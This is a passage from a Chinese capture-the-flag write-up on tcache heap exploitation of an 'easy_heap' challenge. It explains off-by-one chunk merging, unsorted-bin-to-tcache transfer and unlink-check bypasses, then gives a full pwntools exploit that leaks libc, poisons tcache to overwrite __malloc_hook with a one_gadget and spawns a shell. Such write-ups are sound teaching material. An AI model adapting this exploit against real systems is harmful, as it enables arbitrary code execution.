@@ -1,0 +1,121 @@
+当然，我们的最终目的是劫持函数指针（此次仍是揍malloc_hook），方法我们还是打算用经典的double
+link法，尝试构造两个用户指针索引同一个chunk，然后free一个，再通过另一个篡改next指针劫持到malloc_hook，然后分配到malloc_hook再篡改一下劫持到onegadget就行了
+然后我们需要泄露到libc的地址来定位malloc_hook和onegadget
+这样一来，现在的情况是：可以off by one触发合并、需要泄露libc、需要tcache attack劫持控制流
+#### 目的明确，我们现在先思考如何泄露libc
+之前笔者的文章中总结过泄露内存有两种典型思路：堆扩张和重索引
+tcache在堆区，其中的数据都对泄露libc没啥帮助，只能泄露堆区地址，我们应该想办法能构造出unsorted bin
+chunk才能进一步尝试泄露libc地址。怎么进unsorted bin
+chunk呢？在引入tcache机制后，在申请的大小符合规定时，只要tcache里面还有符合要求的，就先从tcache里面出，在free掉一个堆块后，只要与其大小对应的tcache链表还没满（不足7个），就一定先进tcache
+@tcache特性；因此想要free一个chunk进unsorted
+bin，必须先free掉7个相同大小的chunk把tcache填满，才能把它弄进unsorted bin，同样，你要把它再拿出来，也要先malloc
+7次把tcache清空了才能拿到unsorted bin里的。
+此外，我们需要了解tcache转移机制：当用户申请一个堆块的时候，如果tcache已经为空，而fastbin/smallbin/unsorted
+bin中有size符合的chunk时，会先把fastbin/smallbin/unsorted
+bin中的chunk全部转移到tcache中直到填满，然后再从tcache中拿（这就很符合缓存的特性）；转移的过程其实就是前者的常规拆卸操作和后者的常规链入操作。@tcache特性
+注意：经调试证实，unsorted bin合并时，合并后的堆块不会进tcache，在从一个大的unsorted bin
+chunk分割出chunk的情形下，分出来的和剩下的都不会进tcache！ @tcache特性
+也就是说，如果你想从unsorted bin里拿到一个chunk，如果你认为连续malloc
+7次清空了tcache后，再malloc一个就是直接把unsorted bin链尾的那个chunk拿出来就ok了，那就大错特错了！unsorted
+bin里的chunk这时候必须要全部都转移进tcache，然后再从tcache里往外拿！（注意unsorted bin是FIFO，tcache是LIFO）
+了解了以上几个特性，我们可以正式开始考虑，如何利用off by one带来的非法堆块合并来泄露内存了：
+首先我们应该对堆块合并可能带来的利用面熟悉于心：一旦通过伪造preinuse导致合并后，将会获得一个用户指针指向一个已经“被free”了的（在bin中的）堆块，显然这个堆块既然由于被非法合并进了bin，就可以再次被分配到，当它再次被分配到的时候就有两个用户指针指向它了，这就成功地打出了双重索引；此外，被合并的堆块既然进了bin的同时又有着一个用户指针的索引，那么显然可以通过这个用户指针进行读操作泄露fd和bk；另外，如果有理想的溢出条件，则可以隔块合并实现堆扩张来攻击中间的那个堆块，这种手段的好处是最前面的那个堆块可以提前free掉，就天然形成合法的fd和bk了，避免了困难的构造。
+非常好，看来可以一举两得了，泄露fd和bk可以让我们拿到libc地址，而同时有可以构造出双重索引来进行下一步的tcache
+attack劫持。下面我们来看如何来完成这个伟大的合并：
+第一点肯定是要过unlink的“自闭”检查了（检查fd的bk和bk的fd是不是自己，也就是自闭症检查，不管堆块有没有，反正我有，我是真的自闭了），你要合并成功，就得让堆块自闭，不然你就得自闭…我说的是不是很有道理…也就是说fd和bk的值必须得满足检查才行。
+*注：此外在libc2.26中，被unlink堆块的size还要和被free堆块的presize对上才行，某些时候就需要伪造，详见之后的文章《libc版本差异：unlink检查》
+这也是难点所在，我们可爱又可恨的set_log函数给了我们off by
+one，却也给了我们字符截断，这样我们如果想通过先free再分配再读的思路泄露内存，再分配的时候由于截断的机制你永远别想达成目的，就只能借助堆块合并带来的攻击面来泄露，但仍不轻松：
+我要在相邻堆块间触发unlink，就有一个问题，既然被unlink的堆块被一个用户指针索引着，那也就是说，被unlink的堆块已经被分配到了，也就是说不考虑UAF的情况（因为本例中未出现UAF漏洞），那么这个堆块是通过合法途径分配到的，考虑合法的分配途径，比如从top
+chunk出、从unsorted bin出、从small
+bin出、从fastbin出，都过不了自闭检查，那么要过自闭检查的话无非就两种思路了：第一是能通过某种办法使得被unlink堆块的fd和bk能过自闭检查，第二是隔块合并利用天然fd和bk过检。
+第二种思路笔者很喜欢，因为隔块合并大法经常会阴差阳错地天然绕过libc2.26的__builtin_expect (chunksize(P) !=
+prev_size (next_chunk(P)), 0)检查，而不用刻意构造size合法
+第一种思路可以作为tcache类pwn的一个通用技巧来介绍：基于之前介绍的特性，当用户申请chunk时若tcache已空、unsorted
+bin还有，那unsorted bin里的所有chunk会先全部转移进tcache再从tcache中一个个出，又由于unsorted
+bin和tcache分别是FIFO和LIFO，读者自己推演一下这个过程不难发现，转移前后各chunk的bk是不会改变的，而fd的最低字节会由0x00变成0x10（tcache的fd指向chunk数据区）其他字节和原来一模一样！而在此题中，源码的写入逻辑决定了可以把这个0x10写成0x00，这样一来转移前后这几个chunk的fd和bk都和原来在unsorted
+bin中时一样，保护了合法关系，为进一步堆块合并攻击做好了铺垫！
+### 三、EXPLOIT
+这两种思路具体怎么实施呢？下面分别给出作者根据第一种和第二种思路开发的exp：
+EXP1：利用u2t转移
+    from pwn import *
+    #ARCH SETTING
+    context(arch = 'amd64' , os = 'linux')
+    r = process('./easy_heap')
+    #r = remote('127.0.0.1',9999)
+    #FUNCTION DEFINE
+    def new(size,content):
+    r.recvuntil("?n> ")
+    r.sendline("1")
+    r.recvuntil("size n> ")
+    r.sendline(str(size))
+    r.recvuntil("content n> ")
+    r.send(content)
+    def newz():
+    r.recvuntil("?n> ")
+    r.sendline("1")
+    r.recvuntil("size n> ")
+    r.sendline(str(0))
+    def delet(idx):
+    r.recvuntil("?n> ")
+    r.sendline("2")
+    r.recvuntil("index n> ")
+    r.sendline(str(idx))
+    def echo(idx):
+    r.recvuntil("?n> ")
+    r.sendline("3")
+    r.recvuntil("index n> ")
+    r.sendline(str(idx))
+    #MAIN EXPLOIT
+    #memory leak
+    for i in range(10):
+    newz()
+    #choose chunk0 2 4 into unsorted bin
+    delet(1)
+    delet(3)
+    for i in range(5,10):
+    delet(i)
+    #now tcache filled ,waiting queue is idx.1 , 3 , 5~10
+    #make unsorted bin: ustbin -> 4 -> 2 -> 0 ,then chunk2 will be leak_target_chunk
+    delet(0)
+    delet(2)
+    delet(4)
+    #waiting queue is idx.0~10chunk9~5 , 3 , 1 ,and now all chunks was freed ,heap was null
+    #clean tcache
+    for i in range(7):
+    newz() #chunk3 is idx.5 (987653:012345)
+    #unsorted_bin trans to tcache
+    newz() #idx.7:pushing 0x00 on the lowest byte will hijack leak_target_chunk.BK's fd bingo on target!
+    new(0xf8,'x00') #idx.8:1.off-by-one the preinuse bit of chunk3 2.hijack the lowest byte of leak_target_chunk correctly to FD
+    #fill tcache but don't touch idx.7 , 8 , 5 (six enough considering chunk0 remained in tcache)
+    for i in range(5):
+    delet(i)
+    delet(6)
+    #merge & leak
+    delet(5)
+    echo(8)
+    unsorted_bin = u64(r.recv(6).ljust(8,'x00'))
+    libc_base = unsorted_bin - 0x3dac78
+    print(hex(libc_base))
+    malloc_hook = libc_base + 0x3dac10
+    onegadget = libc_base + 0xfdb8e #0x47ca1 #0x7838e #0x47c9a #0xfccde
+    #hijack
+    #clean tcache
+    for i in range(7):
+    newz()
+    newz() #idx.9
+    #now we hold idx.8&9 pointing chunk2
+    delet(0) #passby counts check
+    delet(8)
+    delet(9)
+    new(0x10,p64(malloc_hook))
+    newz()
+    new(0x10,p64(onegadget))
+    #fire
+    #according to the logic that size is inputed after malloc
+    delet(1) #passby idxtable full check
+    #x = input("fucking")
+    r.recvuntil("?n> ")
+    r.sendline("1")
+    r.interactive()
+-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·
